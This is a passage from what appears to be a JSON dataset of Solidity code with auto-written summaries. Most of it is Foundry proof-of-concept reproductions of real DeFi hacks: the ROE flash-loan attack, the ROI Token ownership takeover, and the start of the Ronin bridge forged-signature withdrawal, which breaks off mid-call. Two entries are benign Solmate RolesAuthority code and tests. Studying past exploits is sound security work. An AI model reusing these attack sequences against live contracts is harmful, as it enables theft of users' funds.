        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1613267000913960976\n// @TX\n// https://etherscan.io/tx/0x927b784148b60d5233e57287671cdf67d38e3e69e5b6d0ecacc7c1aeaa98985b\n\ninterface ROE {\n    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;\n    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;\n}\n\ninterface vdWBTC_USDC_LP {\n    function approveDelegation(address delegatee, uint256 amount) external;\n}\n\ncontract ContractTest is DSTest{\n    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    ROE roe = ROE(0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x004375Dff511095CC5A197A54140a24eFEF3A416);\n    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    vdWBTC_USDC_LP LP = vdWBTC_USDC_LP(0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24);\n    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IERC20 roeUSDC = IERC20(0x9C435589f24257b19219ba1563e3c0D8699F27E9);\n    IERC20 vdUSDC = IERC20(0x26cd328E7C96c53BD6CAA6067e08d792aCd92e4E);\n    address roeWBTC_USDC_LP = 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c;\n    uint flashLoanAmount = 5_673_090_338_021;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16384469); \n        cheats.label(address(roe), \"ROE\");\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(WBTC), \"WBTC\");\n        cheats.label(address(Pair), \"Uni-Pair\");\n    }\n\n    function testExploit() external {\n        cheats.startPrank(address(tx.origin));\n        LP.approveDelegation(address(this), type(uint).max);\n        cheats.stopPrank();\n        address [] memory tokens = new address[](1);\n        tokens[0] = address(USDC);\n        uint256 [] memory amounts = new uint256[](1);\n        amounts[0] = flashLoanAmount;\n        bytes memory userData = \"\";\n        balancer.flashLoan(address(this), tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals());\n    }\n\n    function receiveFlashLoan(address[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external {\n        uint borrowAmount = Pair.balanceOf(roeWBTC_USDC_LP);\n        USDC.approve(address(roe), type(uint).max);\n        Pair.approve(address(roe), type(uint).max);\n        roe.deposit(address(USDC), USDC.balanceOf(address(this)), tx.origin, 0);\n        roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);\n        for(uint i; i < 49; ++i){\n            roe.deposit(address(Pair), borrowAmount, address(this), 0);\n            roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);\n        }\n        Pair.transfer(address(Pair), borrowAmount);\n        Pair.burn(address(this));\n        USDC.transfer(address(Pair), 26_025 * 1e6);\n        Pair.sync();\n        roe.borrow(address(USDC), flashLoanAmount, 2, 0, address(this));\n        WBTCToUSDC();\n        USDC.transfer(address(balancer), flashLoanAmount);\n    }\n\n    function WBTCToUSDC() internal {\n        WBTC.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(WBTC);\n        path[1] = address(USDC);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBTC.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}\n\n",
        "summary": "This code is a Solidity smart contract that exploits a vulnerability in the ROE protocol (a lending platform) to perform a flash loan attack and obtain funds from a Balancer vault. The contract interacts with several interfaces and contracts to perform the attack, including the ROE interface, a Uniswap pair contract, a Uniswap router contract, and the vdWBTC_USDC_LP contract. The code sets up a cheat environment using the CheatCodes contract to manipulate the balances and fork network. The testExploit() function triggers the flash loan attack by calling the Balancer flashLoan() function and then uses the received funds to borrow and manipulate token pairs to eventually acquire USDC, which is then transferred to the Balancer contract.",
        "id": "6832df6c-ba93-4a70-ac15-344768ee3c53"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : 157.98 BNB (~44,000 US$)\n// Attacker : 0x91b7f203ed71c5eccf83b40563e409d2f3531114\n// Attack Contract : 0x158af3d23d96e3104bcc65b76d1a6f53d0f74ed0\n// Vulnerable Contract : https://bscscan.com/address/0xe48b75dc1b131fd3a8364b0580f76efd04cf6e9c#code (ROIToken)\n// Attack Tx : 0x0e14cb7eabeeb2a819c52f313c986a877c1fa19824e899d1b91875c11ba053b0\n\n// @NewsTrack\n// Blocksec : https://twitter.com/BlockSecTeam/status/1567746825616236544\n// CertiKAlert : https://twitter.com/CertiKAlert/status/1567754904663429123\n// PANews : https://www.panewslab.com/zh_hk/articledetails/mbzalpdi.html\n// QuillAudits Team : https://medium.com/quillhash/decoding-ragnarok-online-invasion-44k-exploit-quillaudits-261b7e23b55\n\n\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\nIROIToken constant ROI = IROIToken(0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c);\n\ncontract Attacker is Test {\n    IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    IPancakePair constant busdroiPair =  IPancakePair(0x745D6Dd206906dd32b3f35E00533AD0963805124); // BUSD/ROI Pair\n    \n    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 21143795);\n        cheat.deal(address(this), 5 ether);\n        cheat.label(address(ROI), \"ROI\");\n        cheat.label(address(busd), \"BUSD\");\n        cheat.label(address(wbnb), \"WBNB\");\n        cheat.label(address(pancakeRouter), \"PancakeRouter\");\n        cheat.label(address(busdroiPair), \"BUSD/ROI Pair\");\n    }\n\n    function testExploit() public {\n        emit log_named_decimal_uint(\"[Start] Attacker BNB Balance:\", address(this).balance, 18);\n\n        console.log(\"----------------------------------------------------\");\n        console.log(\"Attacker swap some BNB to ROI for attack fund...\");\n        console.log(\"Before [WBNB, BUSD, ROI] swap:\");\n        emit log_named_decimal_uint(\"\\tBNB balance of attacker:\", address(this).balance, 18);\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9);\n\n        address[] memory path = new address[](3);\n        path[0] = address(wbnb);\n        path[1] = address(busd);\n        path[2] = address(ROI); // [WBNB, BUSD, ROI]\n        pancakeRouter.swapETHForExactTokens{value: 5 ether}(111291832999209, path, address(this), block.timestamp); // Swap 5 bnb to busd then swap to ROI, charge 0.25% trading fee\n        \n        console.log(\"After [WBNB, BUSD, ROI] swap:\");\n        emit log_named_decimal_uint(\"\\tBNB balance of attacker:\", address(this).balance, 18);\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9);\n        console.log(\"----------------------------------------------------\");\n\n        ROI.transferOwnership(address(this));   // Broken Access Control\n        ROI.setTaxFeePercent(0);\n        ROI.setBuyFee(0, 0);\n        ROI.setSellFee(0, 0);\n        ROI.setLiquidityFeePercent(0);\n\n        // These's addresses are all of the ROI Token holders, but the [BUSD/ROI Pair] is not listed.\n        // Ref: https://bscscan.com/token/0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c#balances\n        ROI.excludeFromReward(address(0x575e2Cd07E4d6CCBcA708D64b4ba45521A2C0722));\n        ROI.excludeFromReward(address(0x216FC1D66677c9A778C60E6825189508b9619908));\n        ROI.excludeFromReward(address(0x61708418F929f264Edd312aDC7089eB9d69cEd9C));\n        ROI.excludeFromReward(address(0xC81DC8F793415B80d7Ee604e936B79D85BD771B6));\n        ROI.excludeFromReward(address(0x19af64CFB666d7Df8C69F884CDf5d42c0e1F9D0C));\n        ROI.excludeFromReward(address(0xA982444d884e00C7dFBBCB90e7a705E567853d0E));\n        ROI.excludeFromReward(address(0x899045B0B52d55Be0210A1046a01B99C78E44540));\n        ROI.excludeFromReward(address(0xDdda7b2D1B9EbafD37c434b90a09fca6d014682F));\n        ROI.excludeFromReward(address(0xf3C7107024e4935FbFd9f665cF5321146DfBD9a8));\n        ROI.excludeFromReward(address(0x6f84160a01f3D4005eB50582d14F17B72575A80A));\n        ROI.excludeFromReward(address(0x143B8568B1ef2F22f3A67229E80DCF0e6fe9bf96));\n        ROI.excludeFromReward(address(0x16A31000295d1846F16B8F1aee3AeDC6b2cB730b));\n        ROI.excludeFromReward(address(ROI));\n        ROI.excludeFromReward(address(this));\n\n        console.log(\"Attacker sends all ROI to [BUSD/ROI Pair] but withholding 100,000 ROI\");\n        uint256 ROI_bal = ROI.balanceOf(address(this));\n        ROI.transfer(address(busdroiPair), ROI_bal - 100000e9); // taxfee is zero\n        console.log(\"----------------------------------------------------\");\n\n        console.log(\"Before flashloans from [BUSD/ROI Pair]\");\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9); // Expect 100,000\n        emit log_named_decimal_uint(\"\\tBUSD balance of attacker:\", busd.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"\\tROI balance of BUSD/ROI Pair:\", ROI.balanceOf(address(busdroiPair)), 9);\n        emit log_named_decimal_uint(\"\\tBUSD balance of BUSD/ROI Pair:\", busd.balanceOf(address(busdroiPair)), 18);\n        \n        ROI.setTaxFeePercent(99);\n        // Attacker flashloans 4,343,012 ROI from [BUSD/ROI Pair], and attacker will immediately payback\n        busdroiPair.swap(4343012692003417,0,address(this),\"3030\");  // Notice: 99% taxfee will be charged from the [BUSD/ROI Pair]\n        \n        console.log(\"After flashloans from [BUSD/ROI Pair]\");\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9); // Expect 0, Because #L122\n        emit log_named_decimal_uint(\"\\tBUSD balance of attacker:\", busd.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"\\tROI balance of BUSD/ROI Pair:\", ROI.balanceOf(address(busdroiPair)), 9); // Expect before+100,000\n        emit log_named_decimal_uint(\"\\tBUSD balance of BUSD/ROI Pair:\", busd.balanceOf(address(busdroiPair)), 18); // Expect same value\n\n        ROI.setTaxFeePercent(0);\n        ROI.includeInReward(address(this)); // This will set _tOwned[address(this)] = 0\n\n        busdroiPair.sync(); // Sync reserve before swap\n        path[0] = address(ROI);\n        path[2] = address(wbnb); // [ROI, BUSD, WBNB]\n        ROI.approve(address(pancakeRouter), type(uint256).max);\n        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(3986806268542825, 0, path, address(this), block.timestamp); // Oops, zero ROI balance but the _rOwned[address(this)] has been bypassed\n        console.log(\"----------------------------------------------------\");\n        emit log_named_decimal_uint(\"[End] Attacker BNB Balance:\", address(this).balance, 18); \n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        require(keccak256(data) == keccak256(\"3030\"), \"Invalid PancakeSwap Callback\");\n        ROI.transfer(address(busdroiPair), ROI.balanceOf(address(this)));   // Notice: 99% taxfee SHOULD be charged from the attacker\n    }\n\n    receive() external payable {}\n}\n\n\n/* -------------------- Interface -------------------- */\n\ninterface IROIToken {\n    function GetBuyBackTimeInterval() external view returns (uint256);\n    function GetSwapMinutes() external view returns (uint256);\n    function SetBuyBackDivisor(uint256 newDivisor) external;\n    function SetBuyBackMaxTimeForHistories(uint256 newMinutes) external;\n    function SetBuyBackRangeRate(uint256 newPercent) external;\n    function SetBuyBackTimeInterval(uint256 newMinutes) external;\n    function SetSwapMinutes(uint256 newMinutes) external;\n    function Sweep() external;\n    function Sweep(uint256 amount) external;\n    function _addressFees(address) external view returns (bool enable, uint256 _taxFee, uint256 _liquidityFee, uint256 _buyTaxFee, uint256 _buyLiquidityFee, uint256 _sellTaxFee, uint256 _sellLiquidityFee);\n    function _buyBackDivisor() external view returns (uint256);\n    function _buyBackMaxTimeForHistories() external view returns (uint256);\n    function _buyBackRangeRate() external view returns (uint256);\n    function _buyBackTimeInterval() external view returns (uint256);\n    function _buyLiquidityFee() external view returns (uint256);\n    function _buyTaxFee() external view returns (uint256);\n    function _intervalMinutesForSwap() external view returns (uint256);\n    function _isAutoBuyBack() external view returns (bool);\n    function _isEnabledBuyBackAndBurn() external view returns (bool);\n    function _liquidityFee() external view returns (uint256);\n    function _maxTxAmount() external view returns (uint256);\n    function _sellHistories(uint256) external view returns (uint256 time, uint256 bnbAmount);\n    function _sellLiquidityFee() external view returns (uint256);\n    function _sellTaxFee() external view returns (uint256);\n    function _startTimeForSwap() external view returns (uint256);\n    function _taxFee() external view returns (uint256);\n    function afterPreSale() external;\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function buyBackEnabled() external view returns (bool);\n    function buyBackSellLimit() external view returns (uint256);\n    function buyBackSellLimitAmount() external view returns (uint256);\n    function changeRouterVersion(address _router) external returns (address _pair);\n    function deadAddress() external view returns (address);\n    function decimals() external view returns (uint8);\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);\n    function deliver(uint256 tAmount) external;\n    function excludeFromFee(address account) external;\n    function excludeFromReward(address account) external;\n    function getTime() external view returns (uint256);\n    function getUnlockTime() external view returns (uint256);\n    function includeInFee(address account) external;\n    function includeInReward(address account) external;\n    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);\n    function isExcludedFromFee(address account) external view returns (bool);\n    function isExcludedFromReward(address account) external view returns (bool);\n    function lock(uint256 time) external;\n    function marketingAddress() external view returns (address);\n    function marketingDivisor() external view returns (uint256);\n    function minimumTokensBeforeSwapAmount() external view returns (uint256);\n    function name() external view returns (string memory);\n    function owner() external view returns (address);\n    function prepareForPreSale() external;\n    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns (uint256);\n    function renounceOwnership() external;\n    function setAddressFee(address _address, bool _enable, uint256 _addressTaxFee, uint256 _addressLiquidityFee) external;\n    function setAutoBuyBackEnabled(bool _enabled) external;\n    function setBuyAddressFee(address _address, bool _enable, uint256 _addressTaxFee, uint256 _addressLiquidityFee) external;\n    function setBuyBackEnabled(bool _enabled) external;\n    function setBuyBackSellLimit(uint256 buyBackSellSetLimit) external;\n    function setBuyFee(uint256 buyTaxFee, uint256 buyLiquidityFee) external;\n    function setLiquidityFeePercent(uint256 liquidityFee) external;\n    function setMarketingAddress(address _marketingAddress) external;\n    function setMarketingDivisor(uint256 divisor) external;\n    function setMaxTxAmount(uint256 maxTxAmount) external;\n    function setNumTokensSellToAddToBuyBack(uint256 _minimumTokensBeforeSwap) external;\n    function setSellAddressFee(address _address, bool _enable, uint256 _addressTaxFee, uint256 _addressLiquidityFee) external;\n    function setSellFee(uint256 sellTaxFee, uint256 sellLiquidityFee) external;\n    function setSwapAndLiquifyEnabled(bool _enabled) external;\n    function setTaxFeePercent(uint256 taxFee) external;\n    function swapAndLiquifyEnabled() external view returns (bool);\n    function symbol() external view returns (string memory);\n    function tokenFromReflection(uint256 rAmount) external view returns (uint256);\n    function totalFees() external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function transferForeignToken(address _token, address _to) external returns (bool _sent);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function transferOwnership(address newOwner) external;\n    function uniswapV2Pair() external view returns (address);\n    function uniswapV2Router() external view returns (address);\n    function unlock() external;\n}",
        "summary": "This code is an example of how a smart contract can be used to exploit a vulnerability in another smart contract. The Attacker contract uses flash loans to exploit a broken access control vulnerability in the ROI Token contract, allowing the attacker to transfer ownership and make changes to the contract's state. The attacker also manipulates the contract's rewards system, excludes the BUSD/ROI Pair address from the list of token holders, and transfers some of the ROI tokens to the BUSD/ROI Pair. The attacker then uses a swap function from the BUSD/ROI Pair to trigger a callback function that moves all of the attacker's tokens back to the BUSD/ROI Pair. The attacker then swaps the tokens again, but this time with zero balance, but the bypassed _rOwned variable in the contract allowed the attacker to receive the swapped tokens without any balance.",
        "id": "07cc01d4-e474-4a4a-a8f7-dc1c16888508"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\nimport {Auth, Authority} from \"../Auth.sol\";\n\n/// @notice Role based Authority that supports up to 256 roles.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/auth/authorities/RolesAuthority.sol)\n/// @author Modified from Dappsys (https://github.com/dapphub/ds-roles/blob/master/src/roles.sol)\ncontract RolesAuthority is Auth, Authority {\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event UserRoleUpdated(address indexed user, uint8 indexed role, bool enabled);\n\n    event PublicCapabilityUpdated(address indexed target, bytes4 indexed functionSig, bool enabled);\n\n    event RoleCapabilityUpdated(uint8 indexed role, address indexed target, bytes4 indexed functionSig, bool enabled);\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(address _owner, Authority _authority) Auth(_owner, _authority) {}\n\n    /*//////////////////////////////////////////////////////////////\n                            ROLE/USER STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    mapping(address => bytes32) public getUserRoles;\n\n    mapping(address => mapping(bytes4 => bool)) public isCapabilityPublic;\n\n    mapping(address => mapping(bytes4 => bytes32)) public getRolesWithCapability;\n\n    function doesUserHaveRole(address user, uint8 role) public view virtual returns (bool) {\n        return (uint256(getUserRoles[user]) >> role) & 1 != 0;\n    }\n\n    function doesRoleHaveCapability(\n        uint8 role,\n        address target,\n        bytes4 functionSig\n    ) public view virtual returns (bool) {\n        return (uint256(getRolesWithCapability[target][functionSig]) >> role) & 1 != 0;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                           AUTHORIZATION LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function canCall(\n        address user,\n        address target,\n        bytes4 functionSig\n    ) public view virtual override returns (bool) {\n        return\n            isCapabilityPublic[target][functionSig] ||\n            bytes32(0) != getUserRoles[user] & getRolesWithCapability[target][functionSig];\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                   ROLE CAPABILITY CONFIGURATION LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function setPublicCapability(\n        address target,\n        bytes4 functionSig,\n        bool enabled\n    ) public virtual requiresAuth {\n        isCapabilityPublic[target][functionSig] = enabled;\n\n        emit PublicCapabilityUpdated(target, functionSig, enabled);\n    }\n\n    function setRoleCapability(\n        uint8 role,\n        address target,\n        bytes4 functionSig,\n        bool enabled\n    ) public virtual requiresAuth {\n        if (enabled) {\n            getRolesWithCapability[target][functionSig] |= bytes32(1 << role);\n        } else {\n            getRolesWithCapability[target][functionSig] &= ~bytes32(1 << role);\n        }\n\n        emit RoleCapabilityUpdated(role, target, functionSig, enabled);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                       USER ROLE ASSIGNMENT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function setUserRole(\n        address user,\n        uint8 role,\n        bool enabled\n    ) public virtual requiresAuth {\n        if (enabled) {\n            getUserRoles[user] |= bytes32(1 << role);\n        } else {\n            getUserRoles[user] &= ~bytes32(1 << role);\n        }\n\n        emit UserRoleUpdated(user, role, enabled);\n    }\n}\n",
        "summary": "The code is implementing a role-based authority in Solidity that supports up to 256 roles for a blockchain smart contract. It provides methods for assigning roles to users, assigning capabilities to roles, and checking if a user has a particular role or a role has a particular capability. It also has authorization logic for checking if a user can call a function based on their assigned roles and capabilities. The code includes event logging for updates to user roles, public capabilities, and role capabilities.",
        "id": "72865f31-0695-4da5-bea9-31e43bb133c6"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.15;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {MockAuthority} from \"./utils/mocks/MockAuthority.sol\";\n\nimport {Authority} from \"../auth/Auth.sol\";\n\nimport {RolesAuthority} from \"../auth/authorities/RolesAuthority.sol\";\n\ncontract RolesAuthorityTest is DSTestPlus {\n    RolesAuthority rolesAuthority;\n\n    function setUp() public {\n        rolesAuthority = new RolesAuthority(address(this), Authority(address(0)));\n    }\n\n    function testSetRoles() public {\n        assertFalse(rolesAuthority.doesUserHaveRole(address(0xBEEF), 0));\n\n        rolesAuthority.setUserRole(address(0xBEEF), 0, true);\n        assertTrue(rolesAuthority.doesUserHaveRole(address(0xBEEF), 0));\n\n        rolesAuthority.setUserRole(address(0xBEEF), 0, false);\n        assertFalse(rolesAuthority.doesUserHaveRole(address(0xBEEF), 0));\n    }\n\n    function testSetRoleCapabilities() public {\n        assertFalse(rolesAuthority.doesRoleHaveCapability(0, address(0xCAFE), 0xBEEFCAFE));\n\n        rolesAuthority.setRoleCapability(0, address(0xCAFE), 0xBEEFCAFE, true);\n        assertTrue(rolesAuthority.doesRoleHaveCapability(0, address(0xCAFE), 0xBEEFCAFE));\n\n        rolesAuthority.setRoleCapability(0, address(0xCAFE), 0xBEEFCAFE, false);\n        assertFalse(rolesAuthority.doesRoleHaveCapability(0, address(0xCAFE), 0xBEEFCAFE));\n    }\n\n    function testSetPublicCapabilities() public {\n        assertFalse(rolesAuthority.isCapabilityPublic(address(0xCAFE), 0xBEEFCAFE));\n\n        rolesAuthority.setPublicCapability(address(0xCAFE), 0xBEEFCAFE, true);\n        assertTrue(rolesAuthority.isCapabilityPublic(address(0xCAFE), 0xBEEFCAFE));\n\n        rolesAuthority.setPublicCapability(address(0xCAFE), 0xBEEFCAFE, false);\n        assertFalse(rolesAuthority.isCapabilityPublic(address(0xCAFE), 0xBEEFCAFE));\n    }\n\n    function testCanCallWithAuthorizedRole() public {\n        assertFalse(rolesAuthority.canCall(address(0xBEEF), address(0xCAFE), 0xBEEFCAFE));\n\n        rolesAuthority.setUserRole(address(0xBEEF), 0, true);\n        assertFalse(rolesAuthority.canCall(address(0xBEEF), address(0xCAFE), 0xBEEFCAFE));\n\n        rolesAuthority.setRoleCapability(0, address(0xCAFE), 0xBEEFCAFE, true);\n        assertTrue(rolesAuthority.canCall(address(0xBEEF), address(0xCAFE), 0xBEEFCAFE));\n\n        rolesAuthority.setRoleCapability(0, address(0xCAFE), 0xBEEFCAFE, false);\n        assertFalse(rolesAuthority.canCall(address(0xBEEF), address(0xCAFE), 0xBEEFCAFE));\n\n        rolesAuthority.setRoleCapability(0, address(0xCAFE), 0xBEEFCAFE, true);\n        assertTrue(rolesAuthority.canCall(address(0xBEEF), address(0xCAFE), 0xBEEFCAFE));\n\n        rolesAuthority.setUserRole(address(0xBEEF), 0, false);\n        assertFalse(rolesAuthority.canCall(address(0xBEEF), address(0xCAFE), 0xBEEFCAFE));\n    }\n\n    function testCanCallPublicCapability() public {\n        assertFalse(rolesAuthority.canCall(address(0xBEEF), address(0xCAFE), 0xBEEFCAFE));\n\n        rolesAuthority.setPublicCapability(address(0xCAFE), 0xBEEFCAFE, true);\n        assertTrue(rolesAuthority.canCall(address(0xBEEF), address(0xCAFE), 0xBEEFCAFE));\n\n        rolesAuthority.setPublicCapability(address(0xCAFE), 0xBEEFCAFE, false);\n        assertFalse(rolesAuthority.canCall(address(0xBEEF), address(0xCAFE), 0xBEEFCAFE));\n    }\n\n    function testSetRoles(address user, uint8 role) public {\n        assertFalse(rolesAuthority.doesUserHaveRole(user, role));\n\n        rolesAuthority.setUserRole(user, role, true);\n        assertTrue(rolesAuthority.doesUserHaveRole(user, role));\n\n        rolesAuthority.setUserRole(user, role, false);\n        assertFalse(rolesAuthority.doesUserHaveRole(user, role));\n    }\n\n    function testSetRoleCapabilities(\n        uint8 role,\n        address target,\n        bytes4 functionSig\n    ) public {\n        assertFalse(rolesAuthority.doesRoleHaveCapability(role, target, functionSig));\n\n        rolesAuthority.setRoleCapability(role, target, functionSig, true);\n        assertTrue(rolesAuthority.doesRoleHaveCapability(role, target, functionSig));\n\n        rolesAuthority.setRoleCapability(role, target, functionSig, false);\n        assertFalse(rolesAuthority.doesRoleHaveCapability(role, target, functionSig));\n    }\n\n    function testSetPublicCapabilities(address target, bytes4 functionSig) public {\n        assertFalse(rolesAuthority.isCapabilityPublic(target, functionSig));\n\n        rolesAuthority.setPublicCapability(target, functionSig, true);\n        assertTrue(rolesAuthority.isCapabilityPublic(target, functionSig));\n\n        rolesAuthority.setPublicCapability(target, functionSig, false);\n        assertFalse(rolesAuthority.isCapabilityPublic(target, functionSig));\n    }\n\n    function testCanCallWithAuthorizedRole(\n        address user,\n        uint8 role,\n        address target,\n        bytes4 functionSig\n    ) public {\n        assertFalse(rolesAuthority.canCall(user, target, functionSig));\n\n        rolesAuthority.setUserRole(user, role, true);\n        assertFalse(rolesAuthority.canCall(user, target, functionSig));\n\n        rolesAuthority.setRoleCapability(role, target, functionSig, true);\n        assertTrue(rolesAuthority.canCall(user, target, functionSig));\n\n        rolesAuthority.setRoleCapability(role, target, functionSig, false);\n        assertFalse(rolesAuthority.canCall(user, target, functionSig));\n\n        rolesAuthority.setRoleCapability(role, target, functionSig, true);\n        assertTrue(rolesAuthority.canCall(user, target, functionSig));\n\n        rolesAuthority.setUserRole(user, role, false);\n        assertFalse(rolesAuthority.canCall(user, target, functionSig));\n    }\n\n    function testCanCallPublicCapability(\n        address user,\n        address target,\n        bytes4 functionSig\n    ) public {\n        assertFalse(rolesAuthority.canCall(user, target, functionSig));\n\n        rolesAuthority.setPublicCapability(target, functionSig, true);\n        assertTrue(rolesAuthority.canCall(user, target, functionSig));\n\n        rolesAuthority.setPublicCapability(target, functionSig, false);\n        assertFalse(rolesAuthority.canCall(user, target, functionSig));\n    }\n}\n",
        "summary": "This code is a Solidity smart contract that tests the functionality of the \"RolesAuthority\" contract. The RolesAuthority contract manages user roles and permissions, and this test contract includes multiple functions to test the ability of RolesAuthority to manage roles, set capabilities, and determine whether a user has permission to perform an action based on their role. The test function names indicate what each test is checking, such as `testSetRoles`, `testCanCallWithAuthorizedRole`, and `testSetPublicCapabilities`. The contract inherits from `DSTestPlus`, which is a library that provides some useful testing functions. The contract also imports other contracts and libraries such as `MockAuthority` and `Authority`.",
        "id": "d1a8a7d5-6979-4c60-8f59-0a4aedfd9595"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IRoninBridge {\n    function withdrawERC20For(uint256 _withdrawalId, address _user, address _token, uint256 _amount, bytes memory _signatures) external;\n}\n\ncontract ContractTest is DSTest {\n  address attacker = 0x098B716B8Aaf21512996dC57EB0615e2383E2f96;\n  address roninBridge = 0x1A2a1c938CE3eC39b6D47113c7955bAa9DD454F2;\n  address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n  address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 14442834); //fork mainnet at 14442834\n  }\n\n  function testExploit() public {\n    cheats.startPrank(attacker);\n\n    IRoninBridge(roninBridge).withdrawERC20For({ // 0x993e1c42\n      _withdrawalId: 2000000,\n      _user: attacker, \n      _token: WETH, \n      _amount: 173600000000000000000000, \n      _signatures: hex\"01175db2b62ed80a0973b4ea3581b22629026e3c6767125f14a98dc30194a533744ba284b5855cfbc34c1416e7106bd1d4ce84f13ce816370645aad66c0fcae4771b010984ea09911beeadcd3dab46621bc81071ba91ce24d5b7873bc6a34e34c6aafa563916059051649b3c1930425aa3a79a293cacf24a21bda3b2a46a1e3d39a6551c01f962ee0e333c2f7261b3077bb7b7544001d555df4bc2e6a5cae2b2dac3d1fe3875cd1d12fadbeb4c01f01e196aa36e395a94de074652971c646b4b3b7149b3121b0178bd67c4fa659087c5f7696d912dee9db37802a3393bf4bd799e22eb201e78d90dc3f57e99d8916cd0282face42324f3afa0d96b0a09c4f914f15cac9c11037b1b0102b7a3a587c5be368f324893ed06df7bdcd3817b1880bd6dada86df15bd50d275fc694a8914d1818a2d432f980a97892f303d5a893a3eec176f46957958ecb991c\"\n    });\n\n    IRoninBridge(roninBridge).withdrawERC20For({ // 0x993e1c42\n      _withdrawalId: 2000001,\n      _user: attacker, \n      _token: USDC,\n      _amount: 25500000000000, \n      _signatures: 